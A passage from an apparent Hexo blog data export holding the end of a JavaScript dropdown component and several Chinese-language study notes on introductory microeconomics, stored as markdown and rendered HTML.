ev = event || window.event;\n            var target = ev.target || ev.srcElement;\n            ev.stopPropagation();\n            target.style.display = &apos;none&apos;;\n\n            this.DOMselect.setAttribute(&apos;data-isOptionShown&apos;, false);\n        }).bind(this)\n    };\n\n    //整个组件初始化\n    this.init = function() {\n        //清空并添加空元素div和ul\n        this.DOMobj.innerHTML = &apos;&apos;;\n        this.DOMobj.appendChild(this.DOMselect);\n        this.DOMobj.appendChild(this.DOMoptContainer);\n\n        //div作为选择内容框，添加点击事件\n        var self = this;\n        this.DOMselect.addEventListener(&apos;click&apos;, function(){self.prototype.setOptions(options.data);}, true);\n        this.DOMoptContainer.addEventListener(&apos;mouseleave&apos;, self.prototype.loseFocus);\n        //设置默认选中项\n        this.DOMselect.setAttribute(&apos;data-value&apos;, options.chosen[0]);\n        this.DOMselect.setAttribute(&apos;data-content&apos;, options.chosen[1]);\n        this.DOMselect.innerHTML = options.chosen[1];\n\n        this.prototype.setOptions(options.data);\n        this.prototype.updateStyle(options.style);\n    };\n\n    this.init();\n}\n</code></pre>"},{"title":"第三讲——消费者选择理论","_content":"\n> 明天考选修，贴个[哭]\n\n<!-- more -->\n\n# 第6章  消费者选择理论\n\n## 预算约束\n\n收入既定的情况下，对消费者可以支付得起的消费组合的限制\n\n一个“消费束”是其所消费的物品的一个特定组合，比如: 40 条鱼与 300 个芒果\n\n> 在预算约束下，消费者多购买某个产品就要相对应放弃部分产品的购买量，叫做*机会成本*\n\n### 预算约束线（或等收入线）\n\n表明收入一定的情况下，他可以购买得起的消费束\n\n预算线的斜率衡量的是消费者用一种商品交换另一种商品的比率\n\n### 预算约束线的移动\n\n* 收入减少使预算约束线向下移动\n* 一种物品价格的上升使预算约束线向内转动\n\n## 消费者的偏好\n\n### 无差异曲线\n\n给消费者相同满足程度的消费组合的曲线。\n\n#### 四个特征\n\n* 无差异曲线向右下方倾斜\n* 消费者对较高无差异曲线的偏好大于较低无差异曲线\n* 无差异曲线不相交\n* 无差异曲线凸向原点\n\n#### 边际替代率（MRS）\n\n消费者愿意以一种物品交换另一种物品的比率\n\n通常，沿着无差异曲线向右下方移动，边际替代率不断减少。因为人们更愿意放弃他们已经拥有的数量较多的物品，而不愿意放弃不多的物品。\n\n* 完全替代品：无差异曲线为直线的两种物品，有不变的 MRS。\n* 完全互补品：无差异曲线为直角形的两种物品。\n* 近替代品：无差异曲线不是很弯曲，相对平坦\n* 近互补品：无差异曲线非常弯曲\n\n## 最优选择\n\n消费者负担得起的所有消费束中最偏好的消费束\n\n最优点：预算约束线与能相交的最高一条无差异曲线上的交点\n\n在最优点，无差异曲线的斜率等于预算约束线的斜率，即无差异曲线与预算约束线相切\n\n### 效用\n\n效用是从消费某种物品中所得到的满足程度，是一种心理感觉，来源于消费者对物品的偏好\n\n* 总效用：消费一定量某种物品中所得到的总满足程度\n* 边际效用：某种物品的消费量增加一单位所增加的满足程度\n\n=> \n\n**边际效用递减规律**：随着消费者对某种物品消费量的增加，他（她）从该物品连续增加的消费单位中所得到的边际效用递减。\n\n=> \n\n每元钱产生的边际效用相等时总效用最大\n\n> 消费者均衡：消费者以使总效用最大化的方式来配置其收入的状态。\n\n## 外部环境变动对消费者选择的影响\n\n* 收入增加使预算约束线向外移动\n    > 收入增加会使正常物品的需求量增加，收入增加会使低档物品的需求量减少 \n* 某种商品售价降低会产生以下两种效应\n    * 替代效应：某种商品价格下降会使消费者相对购买更多该商品而更少的另一商品B（预算约束线向外转动）\n    * 收入效应：售价降低相当于提升了消费者收入对该商品的实际购买能力\n\n## 劳动供给量\n\n* 替代效应：高工资使闲暇相对于消费更昂贵。因此会减少闲暇时间\u000b 那就是说，会增加劳动供给量\n* 收入效应：高工资使她能负担得起更多的两种物品（闲暇和消费），会增加闲暇时间\n\n收入效应举例：\n\n* 历史趋势：在过去的100多年间，技术进步增加了劳动需求和实际工资，而平均工作日却从每周6天减少为每周5天  \n* 彩票赢家：当一个人获得巨额彩票奖金的同时，他的工资并没有改变—因此没有替代效应\n* 获得遗产：卡内基—给儿子留下巨额财产的父母会使他们儿子的才能和热情大大丧失，而且使他的生活不如没有遗产时那样有用和有价值。\n\n## 小结\n\n* 收入效应是由于价格降低使消费者状况变好而引起的消费变动，它反映在从较低无差异曲线向较高无差异曲线的移动上。价格增加时的收入效应与之相反。\n* 替代效应是由于价格变动鼓励更多地消费变得相对便宜的物品而引起的消费变动，它表现为沿着一条无差异曲线向有不同斜率的点的变动上。","source":"_posts/第三讲——消费者决策.md","raw":"---\n\ntitle: 第三讲——消费者选择理论\n\n---\n\n> 明天考选修，贴个[哭]\n\n<!-- more -->\n\n# 第6章  消费者选择理论\n\n## 预算约束\n\n收入既定的情况下，对消费者可以支付得起的消费组合的限制\n\n一个“消费束”是其所消费的物品的一个特定组合，比如: 40 条鱼与 300 个芒果\n\n> 在预算约束下，消费者多购买某个产品就要相对应放弃部分产品的购买量，叫做*机会成本*\n\n### 预算约束线（或等收入线）\n\n表明收入一定的情况下，他可以购买得起的消费束\n\n预算线的斜率衡量的是消费者用一种商品交换另一种商品的比率\n\n### 预算约束线的移动\n\n* 收入减少使预算约束线向下移动\n* 一种物品价格的上升使预算约束线向内转动\n\n## 消费者的偏好\n\n### 无差异曲线\n\n给消费者相同满足程度的消费组合的曲线。\n\n#### 四个特征\n\n* 无差异曲线向右下方倾斜\n* 消费者对较高无差异曲线的偏好大于较低无差异曲线\n* 无差异曲线不相交\n* 无差异曲线凸向原点\n\n#### 边际替代率（MRS）\n\n消费者愿意以一种物品交换另一种物品的比率\n\n通常，沿着无差异曲线向右下方移动，边际替代率不断减少。因为人们更愿意放弃他们已经拥有的数量较多的物品，而不愿意放弃不多的物品。\n\n* 完全替代品：无差异曲线为直线的两种物品，有不变的 MRS。\n* 完全互补品：无差异曲线为直角形的两种物品。\n* 近替代品：无差异曲线不是很弯曲，相对平坦\n* 近互补品：无差异曲线非常弯曲\n\n## 最优选择\n\n消费者负担得起的所有消费束中最偏好的消费束\n\n最优点：预算约束线与能相交的最高一条无差异曲线上的交点\n\n在最优点，无差异曲线的斜率等于预算约束线的斜率，即无差异曲线与预算约束线相切\n\n### 效用\n\n效用是从消费某种物品中所得到的满足程度，是一种心理感觉，来源于消费者对物品的偏好\n\n* 总效用：消费一定量某种物品中所得到的总满足程度\n* 边际效用：某种物品的消费量增加一单位所增加的满足程度\n\n=> \n\n**边际效用递减规律**：随着消费者对某种物品消费量的增加，他（她）从该物品连续增加的消费单位中所得到的边际效用递减。\n\n=> \n\n每元钱产生的边际效用相等时总效用最大\n\n> 消费者均衡：消费者以使总效用最大化的方式来配置其收入的状态。\n\n## 外部环境变动对消费者选择的影响\n\n* 收入增加使预算约束线向外移动\n    > 收入增加会使正常物品的需求量增加，收入增加会使低档物品的需求量减少 \n* 某种商品售价降低会产生以下两种效应\n    * 替代效应：某种商品价格下降会使消费者相对购买更多该商品而更少的另一商品B（预算约束线向外转动）\n    * 收入效应：售价降低相当于提升了消费者收入对该商品的实际购买能力\n\n## 劳动供给量\n\n* 替代效应：高工资使闲暇相对于消费更昂贵。因此会减少闲暇时间\u000b 那就是说，会增加劳动供给量\n* 收入效应：高工资使她能负担得起更多的两种物品（闲暇和消费），会增加闲暇时间\n\n收入效应举例：\n\n* 历史趋势：在过去的100多年间，技术进步增加了劳动需求和实际工资，而平均工作日却从每周6天减少为每周5天  \n* 彩票赢家：当一个人获得巨额彩票奖金的同时，他的工资并没有改变—因此没有替代效应\n* 获得遗产：卡内基—给儿子留下巨额财产的父母会使他们儿子的才能和热情大大丧失，而且使他的生活不如没有遗产时那样有用和有价值。\n\n## 小结\n\n* 收入效应是由于价格降低使消费者状况变好而引起的消费变动，它反映在从较低无差异曲线向较高无差异曲线的移动上。价格增加时的收入效应与之相反。\n* 替代效应是由于价格变动鼓励更多地消费变得相对便宜的物品而引起的消费变动，它表现为沿着一条无差异曲线向有不同斜率的点的变动上。","slug":"第三讲——消费者决策","published":1,"date":"2017-05-07T12:33:37.694Z","updated":"2017-05-07T12:32:43.116Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4g000gl8sloac8e0tm","content":"<blockquote>\n<p>明天考选修，贴个[哭]</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"第6章-消费者选择理论\"><a href=\"#第6章-消费者选择理论\" class=\"headerlink\" title=\"第6章  消费者选择理论\"></a>第6章  消费者选择理论</h1><h2 id=\"预算约束\"><a href=\"#预算约束\" class=\"headerlink\" title=\"预算约束\"></a>预算约束</h2><p>收入既定的情况下，对消费者可以支付得起的消费组合的限制</p>\n<p>一个“消费束”是其所消费的物品的一个特定组合，比如: 40 条鱼与 300 个芒果</p>\n<blockquote>\n<p>在预算约束下，消费者多购买某个产品就要相对应放弃部分产品的购买量，叫做<em>机会成本</em></p>\n</blockquote>\n<h3 id=\"预算约束线（或等收入线）\"><a href=\"#预算约束线（或等收入线）\" class=\"headerlink\" title=\"预算约束线（或等收入线）\"></a>预算约束线（或等收入线）</h3><p>表明收入一定的情况下，他可以购买得起的消费束</p>\n<p>预算线的斜率衡量的是消费者用一种商品交换另一种商品的比率</p>\n<h3 id=\"预算约束线的移动\"><a href=\"#预算约束线的移动\" class=\"headerlink\" title=\"预算约束线的移动\"></a>预算约束线的移动</h3><ul>\n<li>收入减少使预算约束线向下移动</li>\n<li>一种物品价格的上升使预算约束线向内转动</li>\n</ul>\n<h2 id=\"消费者的偏好\"><a href=\"#消费者的偏好\" class=\"headerlink\" title=\"消费者的偏好\"></a>消费者的偏好</h2><h3 id=\"无差异曲线\"><a href=\"#无差异曲线\" class=\"headerlink\" title=\"无差异曲线\"></a>无差异曲线</h3><p>给消费者相同满足程度的消费组合的曲线。</p>\n<h4 id=\"四个特征\"><a href=\"#四个特征\" class=\"headerlink\" title=\"四个特征\"></a>四个特征</h4><ul>\n<li>无差异曲线向右下方倾斜</li>\n<li>消费者对较高无差异曲线的偏好大于较低无差异曲线</li>\n<li>无差异曲线不相交</li>\n<li>无差异曲线凸向原点</li>\n</ul>\n<h4 id=\"边际替代率（MRS）\"><a href=\"#边际替代率（MRS）\" class=\"headerlink\" title=\"边际替代率（MRS）\"></a>边际替代率（MRS）</h4><p>消费者愿意以一种物品交换另一种物品的比率</p>\n<p>通常，沿着无差异曲线向右下方移动，边际替代率不断减少。因为人们更愿意放弃他们已经拥有的数量较多的物品，而不愿意放弃不多的物品。</p>\n<ul>\n<li>完全替代品：无差异曲线为直线的两种物品，有不变的 MRS。</li>\n<li>完全互补品：无差异曲线为直角形的两种物品。</li>\n<li>近替代品：无差异曲线不是很弯曲，相对平坦</li>\n<li>近互补品：无差异曲线非常弯曲</li>\n</ul>\n<h2 id=\"最优选择\"><a href=\"#最优选择\" class=\"headerlink\" title=\"最优选择\"></a>最优选择</h2><p>消费者负担得起的所有消费束中最偏好的消费束</p>\n<p>最优点：预算约束线与能相交的最高一条无差异曲线上的交点</p>\n<p>在最优点，无差异曲线的斜率等于预算约束线的斜率，即无差异曲线与预算约束线相切</p>\n<h3 id=\"效用\"><a href=\"#效用\" class=\"headerlink\" title=\"效用\"></a>效用</h3><p>效用是从消费某种物品中所得到的满足程度，是一种心理感觉，来源于消费者对物品的偏好</p>\n<ul>\n<li>总效用：消费一定量某种物品中所得到的总满足程度</li>\n<li>边际效用：某种物品的消费量增加一单位所增加的满足程度</li>\n</ul>\n<p>=&gt; </p>\n<p><strong>边际效用递减规律</strong>：随着消费者对某种物品消费量的增加，他（她）从该物品连续增加的消费单位中所得到的边际效用递减。</p>\n<p>=&gt; </p>\n<p>每元钱产生的边际效用相等时总效用最大</p>\n<blockquote>\n<p>消费者均衡：消费者以使总效用最大化的方式来配置其收入的状态。</p>\n</blockquote>\n<h2 id=\"外部环境变动对消费者选择的影响\"><a href=\"#外部环境变动对消费者选择的影响\" class=\"headerlink\" title=\"外部环境变动对消费者选择的影响\"></a>外部环境变动对消费者选择的影响</h2><ul>\n<li>收入增加使预算约束线向外移动<blockquote>\n<p>收入增加会使正常物品的需求量增加，收入增加会使低档物品的需求量减少 </p>\n</blockquote>\n</li>\n<li>某种商品售价降低会产生以下两种效应<ul>\n<li>替代效应：某种商品价格下降会使消费者相对购买更多该商品而更少的另一商品B（预算约束线向外转动）</li>\n<li>收入效应：售价降低相当于提升了消费者收入对该商品的实际购买能力</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"劳动供给量\"><a href=\"#劳动供给量\" class=\"headerlink\" title=\"劳动供给量\"></a>劳动供给量</h2><ul>\n<li>替代效应：高工资使闲暇相对于消费更昂贵。因此会减少闲暇时间\u000b 那就是说，会增加劳动供给量</li>\n<li>收入效应：高工资使她能负担得起更多的两种物品（闲暇和消费），会增加闲暇时间</li>\n</ul>\n<p>收入效应举例：</p>\n<ul>\n<li>历史趋势：在过去的100多年间，技术进步增加了劳动需求和实际工资，而平均工作日却从每周6天减少为每周5天  </li>\n<li>彩票赢家：当一个人获得巨额彩票奖金的同时，他的工资并没有改变—因此没有替代效应</li>\n<li>获得遗产：卡内基—给儿子留下巨额财产的父母会使他们儿子的才能和热情大大丧失，而且使他的生活不如没有遗产时那样有用和有价值。</li>\n</ul>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><ul>\n<li>收入效应是由于价格降低使消费者状况变好而引起的消费变动，它反映在从较低无差异曲线向较高无差异曲线的移动上。价格增加时的收入效应与之相反。</li>\n<li>替代效应是由于价格变动鼓励更多地消费变得相对便宜的物品而引起的消费变动，它表现为沿着一条无差异曲线向有不同斜率的点的变动上。</li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>明天考选修，贴个[哭]</p>\n</blockquote>","more":"<h1 id=\"第6章-消费者选择理论\"><a href=\"#第6章-消费者选择理论\" class=\"headerlink\" title=\"第6章  消费者选择理论\"></a>第6章  消费者选择理论</h1><h2 id=\"预算约束\"><a href=\"#预算约束\" class=\"headerlink\" title=\"预算约束\"></a>预算约束</h2><p>收入既定的情况下，对消费者可以支付得起的消费组合的限制</p>\n<p>一个“消费束”是其所消费的物品的一个特定组合，比如: 40 条鱼与 300 个芒果</p>\n<blockquote>\n<p>在预算约束下，消费者多购买某个产品就要相对应放弃部分产品的购买量，叫做<em>机会成本</em></p>\n</blockquote>\n<h3 id=\"预算约束线（或等收入线）\"><a href=\"#预算约束线（或等收入线）\" class=\"headerlink\" title=\"预算约束线（或等收入线）\"></a>预算约束线（或等收入线）</h3><p>表明收入一定的情况下，他可以购买得起的消费束</p>\n<p>预算线的斜率衡量的是消费者用一种商品交换另一种商品的比率</p>\n<h3 id=\"预算约束线的移动\"><a href=\"#预算约束线的移动\" class=\"headerlink\" title=\"预算约束线的移动\"></a>预算约束线的移动</h3><ul>\n<li>收入减少使预算约束线向下移动</li>\n<li>一种物品价格的上升使预算约束线向内转动</li>\n</ul>\n<h2 id=\"消费者的偏好\"><a href=\"#消费者的偏好\" class=\"headerlink\" title=\"消费者的偏好\"></a>消费者的偏好</h2><h3 id=\"无差异曲线\"><a href=\"#无差异曲线\" class=\"headerlink\" title=\"无差异曲线\"></a>无差异曲线</h3><p>给消费者相同满足程度的消费组合的曲线。</p>\n<h4 id=\"四个特征\"><a href=\"#四个特征\" class=\"headerlink\" title=\"四个特征\"></a>四个特征</h4><ul>\n<li>无差异曲线向右下方倾斜</li>\n<li>消费者对较高无差异曲线的偏好大于较低无差异曲线</li>\n<li>无差异曲线不相交</li>\n<li>无差异曲线凸向原点</li>\n</ul>\n<h4 id=\"边际替代率（MRS）\"><a href=\"#边际替代率（MRS）\" class=\"headerlink\" title=\"边际替代率（MRS）\"></a>边际替代率（MRS）</h4><p>消费者愿意以一种物品交换另一种物品的比率</p>\n<p>通常，沿着无差异曲线向右下方移动，边际替代率不断减少。因为人们更愿意放弃他们已经拥有的数量较多的物品，而不愿意放弃不多的物品。</p>\n<ul>\n<li>完全替代品：无差异曲线为直线的两种物品，有不变的 MRS。</li>\n<li>完全互补品：无差异曲线为直角形的两种物品。</li>\n<li>近替代品：无差异曲线不是很弯曲，相对平坦</li>\n<li>近互补品：无差异曲线非常弯曲</li>\n</ul>\n<h2 id=\"最优选择\"><a href=\"#最优选择\" class=\"headerlink\" title=\"最优选择\"></a>最优选择</h2><p>消费者负担得起的所有消费束中最偏好的消费束</p>\n<p>最优点：预算约束线与能相交的最高一条无差异曲线上的交点</p>\n<p>在最优点，无差异曲线的斜率等于预算约束线的斜率，即无差异曲线与预算约束线相切</p>\n<h3 id=\"效用\"><a href=\"#效用\" class=\"headerlink\" title=\"效用\"></a>效用</h3><p>效用是从消费某种物品中所得到的满足程度，是一种心理感觉，来源于消费者对物品的偏好</p>\n<ul>\n<li>总效用：消费一定量某种物品中所得到的总满足程度</li>\n<li>边际效用：某种物品的消费量增加一单位所增加的满足程度</li>\n</ul>\n<p>=&gt; </p>\n<p><strong>边际效用递减规律</strong>：随着消费者对某种物品消费量的增加，他（她）从该物品连续增加的消费单位中所得到的边际效用递减。</p>\n<p>=&gt; </p>\n<p>每元钱产生的边际效用相等时总效用最大</p>\n<blockquote>\n<p>消费者均衡：消费者以使总效用最大化的方式来配置其收入的状态。</p>\n</blockquote>\n<h2 id=\"外部环境变动对消费者选择的影响\"><a href=\"#外部环境变动对消费者选择的影响\" class=\"headerlink\" title=\"外部环境变动对消费者选择的影响\"></a>外部环境变动对消费者选择的影响</h2><ul>\n<li>收入增加使预算约束线向外移动<blockquote>\n<p>收入增加会使正常物品的需求量增加，收入增加会使低档物品的需求量减少 </p>\n</blockquote>\n</li>\n<li>某种商品售价降低会产生以下两种效应<ul>\n<li>替代效应：某种商品价格下降会使消费者相对购买更多该商品而更少的另一商品B（预算约束线向外转动）</li>\n<li>收入效应：售价降低相当于提升了消费者收入对该商品的实际购买能力</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"劳动供给量\"><a href=\"#劳动供给量\" class=\"headerlink\" title=\"劳动供给量\"></a>劳动供给量</h2><ul>\n<li>替代效应：高工资使闲暇相对于消费更昂贵。因此会减少闲暇时间\u000b 那就是说，会增加劳动供给量</li>\n<li>收入效应：高工资使她能负担得起更多的两种物品（闲暇和消费），会增加闲暇时间</li>\n</ul>\n<p>收入效应举例：</p>\n<ul>\n<li>历史趋势：在过去的100多年间，技术进步增加了劳动需求和实际工资，而平均工作日却从每周6天减少为每周5天  </li>\n<li>彩票赢家：当一个人获得巨额彩票奖金的同时，他的工资并没有改变—因此没有替代效应</li>\n<li>获得遗产：卡内基—给儿子留下巨额财产的父母会使他们儿子的才能和热情大大丧失，而且使他的生活不如没有遗产时那样有用和有价值。</li>\n</ul>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><ul>\n<li>收入效应是由于价格降低使消费者状况变好而引起的消费变动，它反映在从较低无差异曲线向较高无差异曲线的移动上。价格增加时的收入效应与之相反。</li>\n<li>替代效应是由于价格变动鼓励更多地消费变得相对便宜的物品而引起的消费变动，它表现为沿着一条无差异曲线向有不同斜率的点的变动上。</li>\n</ul>"},{"title":"第二讲——市场","_content":"\n> 后天考选修，贴个[哭]\n\n<!-- more -->\n\n# 第三章 供给与需求的市场力量\n\n## 市场和竞争\n\n### 定义\n\n市场是由某种物品或劳务的买者或卖者组成的一个群体\n\n> 买者决定需求\n> 卖者决定供给\n\n### 分类\n\n* 有组织的（如农贸市场）\n* 无组织的（如一个镇上的冰激凌市场）\n* 完全竞争市场\n    * 每个买者卖者对市场价格影响微乎其微（买卖双方均是价格接受者）\n    * 可供销售的物品或劳务完全相同（同质商品）\n* 完全垄断市场\n    * 市场只有一个卖者（垄断的初始定义），并由其决定价格（卖者是价格制定者）\n* （分割）现实中以上两者都比较少，一半市场结构居于这两种之间\n* 垄断竞争市场\n* 寡头垄断市场\n\n## 需求\n\n### 定义\n\n一种物品的需求量，是买者*愿意*并且*能够购买*的这种物品的数量。\n\n### 需求定理\n\n在其他条件不变时，一种物品的价格上升，对该物品的需求量减少；一种物品的价格下降，对该物品的需求量增加。换言之，在其他条件不变时，物品价格与需求量之间呈负相关关系\n\n### 需求表\n\n在其他影响消费者需求的因素不变的情况下，一种物品的价格与其需求量之间关系的表格。\n\n|咖啡价格|需求量|\n|:------:|:---:|\n|￥0.00|16|\n|￥1.00|14|\n|￥2.00|12|\n|￥3.00|10|\n|￥4.00|8|\n|￥5.00|6|\n|￥6.00|4|\n\n### 需求曲线\n\n#### 定义\n\n由需求表的价格为y轴，市场需求量为x轴画的曲线\n\n> 市场需求量是所有买者在每一价格水平下需求量的总和\n\n#### 曲线的移动\n\n* 需求增加：使每一价格水平下的需求量增加的任何变动都会使需求曲线向右移动\n* 需求减少：使每一价格水平下的需求量减少的任何变动都会使需求曲线向左移动\n\n> 区分于\n> \n> * 需求量增加/减少\n> * 价格增加/减少\n\n* 买者数量增加：曲线右移\n* 收入\n    * 正常物品：需求量与收入呈正比\n    * 低档物品：需求量与收入呈反比\n* 相关物品的价格\n    * 替代品：一种物品价格上升引起另一种物品需求量增加\n    * 互补品：一种物品价格上升引起另一种物品需求量减少\n* 嗜好\n* 预期\n\n## 供给\n\n### 定义\n\n一种物品的供给量，是卖者*愿意*并且*能够出售*的一种物品的数量。\n\n### 供给定理\n\n在其他条件不变时，一种物品价格上升，该物品供给量增加；一种物品价格下降，该物品供给量减少。换言之，在其他条件不变时，物品价格与供给量之间呈正相关关系。\n\n### 供给表\n\n在其他条件保持不变情况下，一种物品的价格与供给量之间关系的表格\n\n|咖啡价格|供给量|\n|:------:|:---:|\n|￥0.00|0|\n|￥1.00|3|\n|￥2.00|6|\n|￥3.00|9|\n|￥4.00|12|\n|￥5.00|15|\n|￥6.00|18|\n\n### 供给曲线\n\n...\n\n> 市场供给量：...\n\n#### 移动\n\n* 供给增加：使每一价格水平的供给量都增加的任何一种变动，都会使供给曲线向右移动\n* 供给减少：使每一价格水平的供给量都减少的任何一种变动，都会使供给曲线向左移动\n\n> 区分于\n> \n> * 供给量增加/减少\n> * 价格增加/减少\n\n* 卖者数量增加：右移\n* 投入品价格（成本）下降：右移\n* 技术改进：右移\n* 预期：（奇货可居）\n\n## 需求与供给的结合\n\n需求曲线和供给曲线交点，价格与市场均衡\n\n#### 均衡 ：\n各种力量处于平衡的状态\n#### 市场均衡：\n商品的需求价格等于供给价格，商品的需求数量等于供给数量\n#### 均衡价格（市场出清价格）：\n使供给与需求平衡的价格。\n#### 均衡数量：\n均衡价格下的商品供给量和商品需求量。\n\n### 过剩（超额供给）\n\n市场价格高于均衡价格\n\n供给量大于需求量的状态（即供过于求的状态）\n\n### 短缺（超额需求）\n\n市场价格低于均衡价格\n\n需求量大于供给量的状态（即供不应求的状态）\n\n### 供求定理\n\n任何一种物品的价格调整都会使该物品的供给与需求达到平衡。\n\n价格调整过程即为市场配置稀缺资源的过程。\n\n## 价格配置资源（小结）\n\n* 价格是引导资源配置的信号\n* 经济学家使用供给与需求模型来分析竞争市场\n* **向右下方倾斜的需求曲线**反应了需求定理\n* **向右上方倾斜的供给曲线**反应了供给定理\n* 供给曲线与需求曲线相交决定了市场均衡\n* 当市场价格高于均衡价格时，存在物品的过剩，引起市场价格下降。\n* 当市场价格低于均衡价格时，存在物品的短缺，引起市场价格上升\n* 在市场经济中，价格是引导经济决策，从而配置稀缺资源的信号。\n* 微观经济学有时也称为**价格理论**\n* 为了分析某个事件如何影响一个市场，我们用供求图来考察该事件对均衡价格和均衡数量的影响。我们遵循三个步骤进行：\n    1. 确定该事件是使供给曲线移动，还是使需求曲线移动（还是使两者都移动）\n    2. 确定曲线移动的方向\n    3. 比较新均衡与原来的均衡\n\n# 第4章 供需弹性及其应用\n\n## 弹性\n\n衡量一个变量对另一个变量反应程度的指标。\n\n### =>\n\n* 需求弹性是衡量需求量对其某种决定因素的反应程度的指标。\n* 供给弹性是衡量供给量对其某种决定因素的反应程度的指标。\n\n## 需求弹性\n\n需求价格弹性：衡量一种物品需求量对其价格变动的反应程度\n\n### 计算\n\n需求价格弹性 = 需求量变动百分比 / 价格变动百分比\n\n> 变动百分比 = (终值 - 初始值) / 变动前后平均值（中点法）\n\n> 按照经济学惯例，我们去掉负号，把所有需求价格弹性表示为正数，即取弹性的绝对值。\n\n### 需求价格弹性的决定因素\n\n* 有“相近替代品”的物品的需求往往较富有弹性（相近替代品的可获得性）\n* “范围小的市场”的需求价格弹性往往大于“范围大的市场”的需求价格弹性（市场范围的划定）\n* 奢侈品的需求价格弹性要大于必需品的需求价格弹性（奢侈品和必需品）\n* 相对于短期，物品的需求往往在长期更富有价格弹性（时间长短）\n\n### 需求价格弹性与各种需求曲线之间的关系\n\n需求曲线越平坦，需求价格弹性越大\n\n由此关系可将需求曲线分为\n* 完全无弹性的需求曲线（缺乏弹性的一个极端例子）[弹性=0，需求曲线竖直]\n* 缺乏弹性的需求曲线[弹性<1]\n* 单位弹性的需求曲线[弹性=1]\n* 富有弹性的需求曲线[弹性>1]\n* 完全有弹性的需求曲线（富有弹性的一个极端例子）[弹性无穷大，需求曲线水平]\n\n> 注意：线性需求曲线的斜率为常数，但它的弹性不是常数\n\n### 总收益与需求价格弹性\n\n###￥ 总收益\n\n某种物品的买者支付从而卖者得到的货币量。\n\n在任何一个市场上，总收益 = P x Q \n\n#### 价格变动对总收益的影响取决于需求价格弹性\n\n当需求富有弹性时，价格和总收益反方向变化。\n当需求缺乏弹性时，价格和总收益同方向变动。\n当需求是单位弹性时，价格变动，总收益不变。\n\n### 其他需求弹性\n\n* 需求收入弹性：衡量消费者收入变动时需求量如何变动。\n* 需求的交叉价格弹性：衡量一种物品需求量对另外一种物品价格变动的反应程度\n需求的交叉价格弹性\n = 物品B的需求量变动百分比 \n / 物品A的价格变动百分比\n\n## 供给价格弹性\n\n衡量一种物品供给量对其价格变动的反应程度\n\n> 内容基本同上需求部分\n\n## 小结\n\n* 弹性衡量需求量或供给量对其一个影响因素变动的反应程度\n* 需求价格弹性衡量需求量对价格变动的反应程度。如果弹性小于1，需求缺乏弹性；如果大于1，需求富有弹性\n* 对于缺乏弹性的需求曲线，其总收益随着价格的上升而增加。对于富有弹性的需求曲线，其总收益随着价格的上升而减少\n* 如果某种物品\n    * 没有相近的替代品\n    * 是必需品而不是奢侈品\n    * 市场范围大\n    * 在短期内\n    * 那么，这种物品就更倾向于缺乏弹性\n* 供给价格弹性衡量的是供给量对价格变动的反应程度。如果弹性小于1，供给缺乏弹性。如果弹性大于1，供给富有弹性\n* 供给价格弹性在长期中比在短期中更富有弹性\n* 需求收入弹性衡量的是需求量对消费者收入变动的反应程度\n* 需求的交叉价格弹性衡量一种物品需求量对另一种物品价格变动的反应程度\n\n# 第5章 供给、需求与政府政策\n\n* 价格上限：出售一种物品或服务的法定最高价格，比如租金控制\n* 价格下限：出售一种物品或服务的法定最低价格，比如最低工资 \n\n> 价格上限高于均衡价格时，价格上限是非限制性的。（非限制性的价格上限）\n> \n> 市场力量自然而然地使经济向均衡变动，而且*非限制性的价格上限对市场结果没有影响。*\n>\n> 而限制性的价格上限将导致了需求量大于供给量，因而出现短缺\n\n> 同理，限制性的价格下限将导致供给量大于需求量，因而引起过剩\n\n## 短缺与配给机制\n\n面临短缺时，卖者必须在买者之间配给稀缺物品 \n\n配给机制：（1）排长队  （2）根据卖者的偏好\n\n> 这些配件机制既可能是不公平的，也是无效率的：因为物品并不一定会卖给对它评价最高的买者\n\n> 一个自由竞争市场中的配给机制既有效率（物品卖给对它评价最高的买者），也是客观的（公平的）\n\n> 实际上，决策者进行价格控制的目标往往是想帮助穷人，但往往却伤害了那些它本想帮助的人。比如：最低工资法会增加一些工人的收入，但也是其他工人成为失业者。\n\n## 税收\n\n对买者征税使需求曲线向下移动，其移动幅度为税收量 （要保持买者的需求量需要降低税收价格的市场价，因此下移[需求曲线的y轴是卖者的售价]）\n\n对卖者征税使供给曲线向上移动，移动幅度为税收量（与上同理）\n\n### 税收归宿\n\n税收负担在市场参与者之间进行分配的方式\n\n即，税收总量多少，买者分担多少，卖者分担多少\n\n> 无论对买者还是卖者征税，最后的市场价格、均衡数量以及税收归宿都是*相同*的\n\n### 结论\n\n* 税收抑制了市场活动。当对一种物品征税时，该物品在新均衡时的销售量减少了。\n* 买者与卖者分摊了税收负担。在新均衡时，买者为该物品支付的更多了，而卖者得到的更少了。\n* 对买者征税和对卖者征税是相同的。对买者征税和对卖者征税的唯一区别是谁把钱交给了政府。\n\n### 弹性与税收\n\n* 供给相对于需求更富有弹性，则买者承担了大部分税负\n* 需求相对于供给更富有弹性，则卖者承担了大部分税负\n\n=> \n\n税收负担更多地落在缺乏弹性的市场一方身上。","source":"_posts/第二讲——市场.md","raw":"---\n\ntitle: 第二讲——市场\n\n---\n\n> 后天考选修，贴个[哭]\n\n<!-- more -->\n\n# 第三章 供给与需求的市场力量\n\n## 市场和竞争\n\n### 定义\n\n市场是由某种物品或劳务的买者或卖者组成的一个群体\n\n> 买者决定需求\n> 卖者决定供给\n\n### 分类\n\n* 有组织的（如农贸市场）\n* 无组织的（如一个镇上的冰激凌市场）\n* 完全竞争市场\n    * 每个买者卖者对市场价格影响微乎其微（买卖双方均是价格接受者）\n    * 可供销售的物品或劳务完全相同（同质商品）\n* 完全垄断市场\n    * 市场只有一个卖者（垄断的初始定义），并由其决定价格（卖者是价格制定者）\n* （分割）现实中以上两者都比较少，一半市场结构居于这两种之间\n* 垄断竞争市场\n* 寡头垄断市场\n\n## 需求\n\n### 